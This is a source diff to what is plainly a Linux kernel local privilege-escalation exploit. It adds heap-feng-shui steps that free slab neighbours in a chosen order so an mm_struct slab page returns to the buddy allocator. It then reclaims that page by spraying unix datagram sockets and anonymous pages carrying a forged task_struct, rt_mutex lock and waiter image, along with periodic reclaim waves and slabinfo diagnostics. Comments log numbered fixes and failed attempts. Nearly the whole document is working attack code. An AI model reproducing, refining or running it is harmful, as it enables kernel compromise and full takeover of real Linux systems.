@@ -5,6 +5,11 @@ static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
 static int reclaim_sv[2] = {-1, -1};
+/* Fix #23: extra socketpairs multiply the queued skb frag volume beyond
+ * what a single SNDBUF-capped stream socket can hold (~250 x 64 KB). */
+#define RECLAIM_EXTRA_SOCKS_MAX 8
+static int reclaim_extra_sv[RECLAIM_EXTRA_SOCKS_MAX][2];
+static int reclaim_extra_count;
 static struct mm_ctx prepare_ctx;
 static struct mm_ctx spray_ctx;
 static struct mm_ctx pre_ctx;
@@ -112,6 +117,20 @@ int select_slide_payload_index(size_t index) {
   if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
     return 0;
   }
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (getenv("COMPACT_PAYLOAD") || getenv("DGRAM_RECLAIM")) {
+    /* Compact 4 KB payload (fix #22/#26): task/lock/waiter/marker all
+     * live in the FIRST page of the order-3 block so an order-0 anon
+     * fault that splits the block (page 0) or a dgram skb head object
+     * carries the whole walk image. */
+    fake_task = slide_bank_payload_base + 0x1000;
+    fake_lock = slide_bank_payload_base + 0x1980;
+    fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
+    slide_oracle_parent = slide_bank_parents[index];
+    slide_oracle_target = slide_bank_targets[index];
+    return 1;
+  }
+#endif
   fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF +
               index * SLIDE_BANK_TASK_STRIDE;
   fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
@@ -505,6 +524,15 @@ void close_reclaim_sockets(void) {
       reclaim_sv[i] = -1;
     }
   }
+  for (int i = 0; i < reclaim_extra_count; i++) {
+    for (int j = 0; j < 2; j++) {
+      if (reclaim_extra_sv[i][j] > 0) {
+        close(reclaim_extra_sv[i][j]);
+        reclaim_extra_sv[i][j] = -1;
+      }
+    }
+  }
+  reclaim_extra_count = 0;
 }
 
 int reclaim_receiver_fd(void) {
@@ -579,6 +607,55 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     defined(SLIDE_P0_OFFSET_CANDIDATES)
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     slide_bank_payload_base = payload_base;
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+    if (getenv("COMPACT_PAYLOAD") || getenv("DGRAM_RECLAIM")) {
+      /* Fix #22/#26: compact 4 KB walk image.  KP #49 proved the freed
+       * mm_struct slab page never reached the buddy allocator, killing
+       * the page-level channels; fix #21 (LATE_NEIGHBOUR_FREE) forces
+       * the discard.  Order-0 anon faults then split the block and hand
+       * out its FIRST 4 KB page first, so the whole walk image must
+       * live in base+0x000-0xFFF: task 0x000-0x958, lock 0x980, waiter
+       * 0x9C0-0xA18, marker 0xA20.  Nothing below +0x40 is referenced,
+       * so the image also survives a dgram skb head's +0x22 reserve.
+       * Only the gate slot is supported. */
+      uintptr_t parent = direct_to_page(base);
+      if (getenv("P0_ORACLE_PARENT_PIPEBUF")) {
+        parent = direct_to_page(pipebuf_page_base);
+      }
+      uintptr_t target = pipebuf_page_base +
+                         P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+      p0_gate_page_struct = parent;
+      slide_bank_parents[0] = parent;
+      slide_bank_targets[0] = target;
+      for (size_t idx = 0x1000; idx + 0x1000 <= SKB_SEND_SIZE;
+           idx += 0x1000) {
+        unsigned char *p = skb_buf + idx;
+        memset(p, 0, 0x1000);
+        uintptr_t task = payload_base + idx;
+        uintptr_t lock = payload_base + idx + 0x980;
+        uintptr_t waiter = lock + 0x40;
+        put32(p, 0x980 + 0x00, 0);
+        put64(p, 0x980 + 0x08, waiter);
+        put64(p, 0x980 + 0x10, waiter);
+        put64(p, 0x980 + 0x18, SLIDE_LOCK_OWNER_VALUE);
+        put_fake_waiter(p, 0x9C0, 1, 0, 0, parent, 0, target, task,
+                        lock, SLIDE_FAKE_WAITER_PRIO);
+        put32(p, FAKE_TASK_USAGE_OFF, 0x100);
+        put32(p, FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+        put32(p, FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
+        put64(p, FAKE_TASK_TASK_GROUP_OFF, 0);
+        put32(p, FAKE_TASK_PI_LOCK_OFF, 0);
+        put64(p, FAKE_TASK_PI_WAITERS_OFF,
+              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+        put64(p, FAKE_TASK_PI_WAITERS_OFF + 0x08,
+              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+        put64(p, FAKE_TASK_PI_TOP_TASK_OFF, task);
+        put64(p, FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+        memcpy(p + 0xA20, "RMG-P0-ORACLE-GATE", 18);
+      }
+      return select_slide_payload_index(0);
+    }
+#endif
     for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
       unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
       memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
@@ -588,6 +665,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
         if (slot == P0_ORACLE_GATE_SLOT) {
           parent = direct_to_page(base);
+          if (getenv("P0_ORACLE_PARENT_PIPEBUF")) {
+            /* Diagnostic: point the erase's parent at the oracle pipebuf
+             * page itself.  A completed erase then flips the gate pipe's
+             * read-back no matter where the payload reclaim landed, which
+             * separates "erase never fired/completed" from "fired but the
+             * marker page is wrong (reclaim miss)". */
+            parent = direct_to_page(pipebuf_page_base);
+          }
           target = pipebuf_page_base +
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
           p0_gate_page_struct = parent;
@@ -765,6 +850,196 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
+/* Fix #28 (SLABINFO_DIAG, diagnostic): dump mm_struct / kmalloc-8k slab
+ * counts at the key reclaim phases.  Tells us whether close(memfd_leak)
+ * really discards the empty target slab to the buddy allocator (num_slabs
+ * drops by 1) and which cache grows during the spray window (the
+ * slab-growth thief). */
+static void slabinfo_diag(const char *tag) {
+  if (!getenv("SLABINFO_DIAG")) {
+    return;
+  }
+  FILE *f = fopen("/proc/slabinfo", "r");
+  if (!f) {
+    pr_warning("slabinfo diag open failed errno=%d\n", errno);
+    return;
+  }
+  char line[256];
+  unsigned long mm_a = 0, mm_t = 0, mm_as = 0, mm_ns = 0;
+  unsigned long k8_a = 0, k8_t = 0, k8_as = 0, k8_ns = 0;
+  while (fgets(line, sizeof(line), f)) {
+    if (!strncmp(line, "mm_struct ", 10)) {
+      sscanf(line,
+             "mm_struct %lu %lu %*u %*u %*u : tunables %*u %*u %*u : "
+             "slabdata %lu %lu",
+             &mm_a, &mm_t, &mm_as, &mm_ns);
+    } else if (!strncmp(line, "kmalloc-8k ", 11)) {
+      sscanf(line,
+             "kmalloc-8k %lu %lu %*u %*u %*u : tunables %*u %*u %*u : "
+             "slabdata %lu %lu",
+             &k8_a, &k8_t, &k8_as, &k8_ns);
+    }
+  }
+  fclose(f);
+  pr_info("slabinfo[%s] mm=%lu/%lu slabs=%lu/%lu k8k=%lu/%lu slabs=%lu/%lu\n",
+          tag, mm_a, mm_t, mm_as, mm_ns, k8_a, k8_t, k8_as, k8_ns);
+}
+
+/* Fix #29 (RECLAIM_WAVES): run 8 proved the fire + physical write work,
+ * but the gate read the target page as all zeros — the block was still
+ * FREE at walk time, i.e. it reaches the buddy allocator LATE (deferred
+ * slab discard / partial-list churn from the deferred prepare cleanup),
+ * long after the one-shot spray has finished.  Keep reclaiming in
+ * periodic waves across the whole arming window so that whenever the
+ * block lands in the buddy pool, a wave claims it with our image before
+ * the consumer walk runs.  Each wave uses fresh sockets (old ones are
+ * ENOBUFS-full) and small bursts to bound memory. */
+static void *reclaim_wave_main(void *arg) {
+  (void)arg;
+  int waves = 20;
+  long gap_ms = 8;
+  const char *waves_env = getenv("RECLAIM_WAVES");
+  if (waves_env && *waves_env) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(waves_env, &end, 0);
+    if (!errno && end != waves_env && !*end && value >= 1 && value <= 64) {
+      waves = (int)value;
+    }
+  }
+  const char *gap_env = getenv("RECLAIM_WAVE_GAP_MS");
+  if (gap_env && *gap_env) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(gap_env, &end, 0);
+    if (!errno && end != gap_env && !*end && value >= 1 && value <= 100) {
+      gap_ms = value;
+    }
+  }
+
+  struct iovec dgram_iov;
+  memset(&dgram_iov, 0, sizeof(dgram_iov));
+  dgram_iov.iov_base = skb_buf + 0x1000 + 0x22;
+  dgram_iov.iov_len = 0x1000 - 0x22;
+  struct msghdr dgram_msg;
+  memset(&dgram_msg, 0, sizeof(dgram_msg));
+  dgram_msg.msg_iov = &dgram_iov;
+  dgram_msg.msg_iovlen = 1;
+  struct iovec iov;
+  memset(&iov, 0, sizeof(iov));
+  iov.iov_base = skb_buf;
+  iov.iov_len = SKB_SEND_SIZE;
+  struct msghdr msg;
+  memset(&msg, 0, sizeof(msg));
+  msg.msg_iov = &iov;
+  msg.msg_iovlen = 1;
+
+  /* Keep the wave thread off the exploit core so the bursts do not
+   * disturb the slide child arming timeline. */
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  if (cpu_count > 2) {
+    pin_to_core((exploit_core() + 2) % cpu_count);
+  }
+
+  int stash[64][2];
+  size_t stash_cnt = 0;
+  void *anon_stash[64];
+  size_t anon_stash_cnt = 0;
+  int total_dgram = 0;
+  int total_stream = 0;
+  int total_anon = 0;
+  for (int wave = 0; wave < waves; wave++) {
+    usleep(gap_ms * 1000);
+    if (!skb_buf) {
+      break;
+    }
+    int dv[2] = {-1, -1};
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, dv) == 0) {
+      int sndbuf = 4 << 20;
+      setsockopt(dv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+      int fl = fcntl(dv[0], F_GETFL, 0);
+      if (fl >= 0) {
+        fcntl(dv[0], F_SETFL, fl | O_NONBLOCK);
+      }
+      for (int i = 0; i < 512; i++) {
+        if (sendmsg(dv[0], &dgram_msg, MSG_DONTWAIT) <= 0) {
+          break;
+        }
+        total_dgram++;
+      }
+    }
+    int tv[2] = {-1, -1};
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, tv) == 0) {
+      int sndbuf = 1 << 20;
+      setsockopt(tv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+      int fl = fcntl(tv[0], F_GETFL, 0);
+      if (fl >= 0) {
+        fcntl(tv[0], F_SETFL, fl | O_NONBLOCK);
+      }
+      for (int i = 0; i < 64; i++) {
+        if (sendmsg(tv[0], &msg, MSG_DONTWAIT) <= 0) {
+          break;
+        }
+        total_stream++;
+      }
+    }
+    /* Fix #30: MOVABLE order-0 channel.  CONFIG_SHUFFLE_PAGE_ALLOCATOR
+     * kills LIFO and the freed block's pageblock may sit on the
+     * MOVABLE/RECLAIMABLE free lists where our UNMOVABLE socket sprays
+     * never draw from.  Once the kernel splits the block, its eight
+     * order-0 pages enter the MOVABLE pool; sustained anon faults
+     * carrying the compact 4 KB image are the highest-rate controlled
+     * MOVABLE allocations we have, so they are the likeliest receivers
+     * of the split pages. */
+    if (getenv("RECLAIM_WAVE_ANON")) {
+      unsigned char *grab =
+          mmap(NULL, (size_t)2 << 20, PROT_READ | PROT_WRITE,
+               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+      if (grab != MAP_FAILED) {
+        for (size_t off = 0; off < (size_t)2 << 20; off += PAGE_SIZE) {
+          memcpy(grab + off, skb_buf + 0x1000, PAGE_SIZE);
+          total_anon++;
+        }
+        if (anon_stash_cnt < 64) {
+          anon_stash[anon_stash_cnt++] = grab;
+        } else {
+          munmap(grab, (size_t)2 << 20);
+        }
+      }
+    }
+    if (stash_cnt < 64) {
+      stash[stash_cnt][0] = dv[0];
+      stash[stash_cnt][1] = dv[1];
+      stash_cnt++;
+    } else {
+      close(dv[0]);
+      close(dv[1]);
+    }
+    if (stash_cnt < 64) {
+      stash[stash_cnt][0] = tv[0];
+      stash[stash_cnt][1] = tv[1];
+      stash_cnt++;
+    } else {
+      close(tv[0]);
+      close(tv[1]);
+    }
+  }
+  for (size_t i = 0; i < anon_stash_cnt; i++) {
+    munmap(anon_stash[i], (size_t)2 << 20);
+  }
+  for (size_t i = 0; i < stash_cnt; i++) {
+    if (stash[i][0] >= 0) {
+      close(stash[i][0]);
+    }
+    if (stash[i][1] >= 0) {
+      close(stash[i][1]);
+    }
+  }
+  pr_info("reclaim waves done dgram=%d stream=%d anon=%d waves=%d gap_ms=%ld\n",
+          total_dgram, total_stream, total_anon, waves, gap_ms);
+  return NULL;
+}
+
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SLAB_SZ;
@@ -853,6 +1128,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, (leaked - base) / MM_STRUCT_SLAB_SZ);
+  slabinfo_diag("leak");
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -880,6 +1156,49 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   if (reclaim_flags >= 0) {
     fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
   }
+  /* Fix #23 (SKB_RECLAIM_SOCKS): a single 8 MB stream socket buffer holds
+   * only ~250 64 KB sends before ENOBUFS (~500 order-3 frags).  KP #52
+   * showed that volume still loses the buddy race to third-party
+   * allocations, so allow extra socketpairs (each with its own SNDBUF)
+   * to multiply the queued frag volume until the spray is deep enough to
+   * always consume the buddy-released target block. */
+  int reclaim_socks = 1;
+  const char *socks_env = getenv("SKB_RECLAIM_SOCKS");
+  if (socks_env && *socks_env) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(socks_env, &end, 0);
+    if (!errno && end != socks_env && !*end && value >= 1 &&
+        value <= RECLAIM_EXTRA_SOCKS_MAX + 1) {
+      reclaim_socks = (int)value;
+    }
+  }
+  reclaim_extra_count = 0;
+  int dgram_reclaim = getenv("DGRAM_RECLAIM") != NULL;
+  for (int i = 1; i < reclaim_socks; i++) {
+    int sv[2];
+    /* Fix #26 (DGRAM_RECLAIM): extra sockets are unix DGRAM pairs.  Each
+     * ~4 KB datagram allocates its data buffer inline via kmalloc
+     * (order-3 slab, kmalloc-8k) with almost fully controlled content —
+     * turning slab GROWTH itself into a controlled-content carrier:
+     * whichever buddy block (incl. our freed target block) a growing
+     * slab claims becomes a page full of our walk image.  This defuses
+     * the KP #52 thief, where the first order-3 allocation after the
+     * free (plausibly the stream spray's own skb-struct slab growth)
+     * stole the block into a kernel-content slab page. */
+    if (socketpair(AF_UNIX, dgram_reclaim ? SOCK_DGRAM : SOCK_STREAM,
+                   0, sv) != 0) {
+      break;
+    }
+    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+    int extra_flags = fcntl(sv[0], F_GETFL, 0);
+    if (extra_flags >= 0) {
+      fcntl(sv[0], F_SETFL, extra_flags | O_NONBLOCK);
+    }
+    reclaim_extra_sv[reclaim_extra_count][0] = sv[0];
+    reclaim_extra_sv[reclaim_extra_count][1] = sv[1];
+    reclaim_extra_count++;
+  }
   int pcp_shaping_sv[2];
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));
 
@@ -900,6 +1219,48 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+
+  size_t drain_triggers = MM_DRAIN_TRIGGERS > 0
+      ? (size_t)MM_DRAIN_TRIGGERS
+      : prepare_ctx.mm_cnt / mm_objs_per_slab;
+  const char *drain_env = getenv("MM_DRAIN_TRIGGERS");
+  if (drain_env && *drain_env) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long value = strtoul(drain_env, &end, 0);
+    if (!errno && end != drain_env && !*end && value <= 31) {
+      drain_triggers = value ? (size_t)value : 1;
+    }
+  }
+
+  /* Fix #21 (LATE_NEIGHBOUR_FREE): KP #49 proved the target page NEVER
+   * leaves the mm_struct cache — the neighbours freed first (fix #19/#20)
+   * empty the slab while the per-node partial count is still low, so the
+   * empty slab stays on the partial list and system forks refill the
+   * leaked slot before any reclaim runs (all four fires walked real
+   * mm_struct content, not payload).  An empty slab is only discarded to
+   * the buddy allocator when __slab_free sees nr_partial >= min_partial.
+   * So run the prepare-spray drains FIRST: each killed child turns one
+   * full slab partial, raising nr_partial above min_partial (default 5).
+   * Only then free the neighbours; the final close(memfd_leak) below
+   * empties the target slab under high partial pressure and its order-3
+   * page goes straight to the buddy allocator, where the immediate skb
+   * spray below can claim it. */
+  int late_neighbour_free = getenv("LATE_NEIGHBOUR_FREE") != NULL;
+  if (late_neighbour_free) {
+    for (size_t i = 0; i < drain_triggers; i++) {
+      size_t index = i * mm_objs_per_slab;
+      SYSCHK(close(prepare_ctx.memfds[index]));
+      prepare_ctx.memfds[index] = -1;
+      kill_child(prepare_ctx.childs[index]);
+      prepare_ctx.childs[index] = -1;
+    }
+    pr_info("mm early drain (late neighbour free) triggers=%zu\n",
+            drain_triggers);
+    sched_yield();
+    sched_yield();
+  }
+
   for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
     SYSCHK(close(spray_ctx.memfds[i]));
     spray_ctx.memfds[i] = -1;
@@ -927,43 +1288,66 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
-  size_t drain_triggers = MM_DRAIN_TRIGGERS > 0
-      ? (size_t)MM_DRAIN_TRIGGERS
-      : prepare_ctx.mm_cnt / mm_objs_per_slab;
-  const char *drain_env = getenv("MM_DRAIN_TRIGGERS");
-  if (drain_env && *drain_env) {
-    char *end = NULL;
-    errno = 0;
-    unsigned long value = strtoul(drain_env, &end, 0);
-    if (!errno && end != drain_env && !*end && value <= 31) {
-      drain_triggers = value ? (size_t)value : 1;
+  /* Fix #19: the target-slab neighbours must ALL be freed BEFORE the
+   * drain/cleanup pressure below, not after it.  An empty slub slab sits
+   * on the per-node partial list; it only returns to the buddy allocator
+   * (where the skb order-3 frags can claim it) when partial-list pressure
+   * discards it.  Fix #18 moved these closes after the drains, which made
+   * reclaim structurally impossible; KP #46 (walk consumed garbage from
+   * the unreclaimed page) confirmed the miss.  Fix #21 supersedes this
+   * ordering for LATE_NEIGHBOUR_FREE: drains run first (above) so the
+   * empty target slab is discarded to the buddy allocator immediately. */
+  if (!late_neighbour_free) {
+    for (size_t i = 0; i < drain_triggers; i++) {
+      size_t index = i * mm_objs_per_slab;
+      SYSCHK(close(prepare_ctx.memfds[index]));
+      prepare_ctx.memfds[index] = -1;
+      kill_child(prepare_ctx.childs[index]);
+      prepare_ctx.childs[index] = -1;
     }
+    pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
   }
-  for (size_t i = 0; i < drain_triggers; i++) {
-    size_t index = i * mm_objs_per_slab;
-    SYSCHK(close(prepare_ctx.memfds[index]));
-    prepare_ctx.memfds[index] = -1;
-    kill_child(prepare_ctx.childs[index]);
-    prepare_ctx.childs[index] = -1;
-  }
-  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
+  slabinfo_diag("post-free");
 
-  /* Free ALL remaining prepare_ctx objects BEFORE the reclaim sends.
-   * The target slab page can only return to the buddy allocator when
-   * every object in it has been freed.  Previously this cleanup ran
-   * after the sends, so the target page was never available for the
-   * sk_buff fragments to reclaim. */
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    if (prepare_ctx.memfds[i] >= 0) {
-      SYSCHK(close(prepare_ctx.memfds[i]));
-      prepare_ctx.memfds[i] = -1;
-    }
-    if (prepare_ctx.childs[i] > 0) {
-      kill_child(prepare_ctx.childs[i]);
-      prepare_ctx.childs[i] = -1;
+  /* ANON_GRAB_TEST (diagnostic): fault 256 anonymous pages right after the
+   * drains, before the skb sends.  If our own order-0 faults can win the
+   * freed target page (KP #37 showed random anon memory can), the walk
+   * will consume 0x41 bytes and the crash dump shows the unmistakable
+   * 0x4141414141414141 pattern — a cheap yes/no for the order-0 reclaim
+   * redesign before investing in a compact 4 KB payload layout.
+   * COMPACT_PAYLOAD (fix #22): same channel, but every grab page carries
+   * the 4 KB walk image (skb_buf idx 0x1000), so whichever fault splits
+   * the buddy-released block installs our payload at base+0x000. */
+  if (getenv("ANON_GRAB_TEST") || getenv("COMPACT_PAYLOAD")) {
+    size_t grab_size = (size_t)1 << 20;
+    unsigned char *grab =
+        mmap(NULL, grab_size, PROT_READ | PROT_WRITE,
+             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (grab == MAP_FAILED) {
+      pr_warning("anon grab mmap failed errno=%d\n", errno);
+    } else {
+      int compact = getenv("COMPACT_PAYLOAD") != NULL;
+      for (size_t off = 0; off < grab_size; off += PAGE_SIZE) {
+        if (compact) {
+          memcpy(grab + off, skb_buf + 0x1000, PAGE_SIZE);
+        } else {
+          memset(grab + off, 0x41, PAGE_SIZE);
+        }
+      }
+      pr_info("anon grab faulted pages=%zu compact=%d\n",
+              grab_size / PAGE_SIZE, compact);
     }
   }
 
+  /* Fix #20: send the reclaim frags IMMEDIATELY after the drain triggers
+   * and defer the remaining prepare_ctx cleanup until after the sends.
+   * The target-slab objects live in pre_ctx/post_ctx/memfd_leak (already
+   * closed above, before the drains) in the common case, so the target
+   * page reaches the buddy allocator during the drains; every child exit
+   * between that point and the first send is a chance for a competing
+   * allocation to steal the page (KP #46/#47: both fires walked garbage).
+   * The rare attempts whose target slab still holds a prepare_ctx object
+   * simply miss, same as before. */
   int reclaim_sends = SKB_RECLAIM_SENDS;
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
@@ -978,18 +1362,80 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
   }
   int reclaim_sent = 0;
-  for (int i = 0; i < reclaim_sends; i++) {
-    errno = 0;
-    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
-    if (sent <= 0) {
+  int reclaim_sock_total = 1 + reclaim_extra_count;
+  if (dgram_reclaim) {
+    /* Fix #26: dgram spray FIRST, before the stream frag sends — the
+     * first order-3 allocation after close(memfd_leak) decides who owns
+     * the buddy-released target block, and every dgram data kmalloc is
+     * controlled content.  The dgram payload is the compact 4 KB image
+     * (skb_buf idx 0x1000) shifted by the skb head reserve (+0x22):
+     * object[0x22+i] = payload[i] = image[0x22+i], so the kmalloc-8k
+     * object equals the image byte-for-byte. */
+    struct iovec dgram_iov;
+    memset(&dgram_iov, 0, sizeof(dgram_iov));
+    dgram_iov.iov_base = skb_buf + 0x1000 + 0x22;
+    dgram_iov.iov_len = 0x1000 - 0x22;
+    struct msghdr dgram_msg;
+    memset(&dgram_msg, 0, sizeof(dgram_msg));
+    dgram_msg.msg_iov = &dgram_iov;
+    dgram_msg.msg_iovlen = 1;
+    for (int s = 1; s < reclaim_sock_total; s++) {
+      /* ~4.7 KB truesize per dgram: an 8 MB buffer holds ~1700, far
+       * beyond the 256 stream cap — raise the per-socket dgram limit;
+       * ENOBUFS is the real stop. */
+      for (int i = 0; i < reclaim_sends * 8; i++) {
+        errno = 0;
+        ssize_t sent =
+            sendmsg(reclaim_extra_sv[s - 1][0], &dgram_msg, MSG_DONTWAIT);
+        if (sent <= 0) {
+          break;
+        }
+        reclaim_sent++;
+      }
+    }
+    pr_info("dgram reclaim sends=%d socks=%d\n", reclaim_sent,
+            reclaim_extra_count);
+  }
+  for (int s = 0; s < reclaim_sock_total; s++) {
+    if (dgram_reclaim && s > 0) {
       break;
     }
-    reclaim_sent++;
+    int send_fd = s == 0 ? reclaim_sv[0] : reclaim_extra_sv[s - 1][0];
+    for (int i = 0; i < reclaim_sends; i++) {
+      errno = 0;
+      ssize_t sent = sendmsg(send_fd, &msg, MSG_DONTWAIT);
+      if (sent <= 0) {
+        break;
+      }
+      reclaim_sent++;
+    }
   }
-  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
-          reclaim_sent, reclaim_sends, payload_mode);
+  pr_info("sk_buff reclaim sends=%d/%d socks=%d mode=%d\n", reclaim_sent,
+          reclaim_sends * reclaim_sock_total, reclaim_sock_total,
+          payload_mode);
+  slabinfo_diag("post-spray");
+
+  /* Deferred from before the sends (fix #20): release the rest of the
+   * prepare spray now that the reclaim frags are queued. */
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    if (prepare_ctx.memfds[i] >= 0) {
+      SYSCHK(close(prepare_ctx.memfds[i]));
+      prepare_ctx.memfds[i] = -1;
+    }
+    if (prepare_ctx.childs[i] > 0) {
+      kill_child(prepare_ctx.childs[i]);
+      prepare_ctx.childs[i] = -1;
+    }
+  }
   kernelsnitch_cleanup(ks);
   ks = NULL;
+
+  if (getenv("RECLAIM_WAVES")) {
+    pthread_t wave_tid;
+    if (pthread_create(&wave_tid, NULL, reclaim_wave_main, NULL) == 0) {
+      pthread_detach(wave_tid);
+    }
+  }
 
   return base;
 }
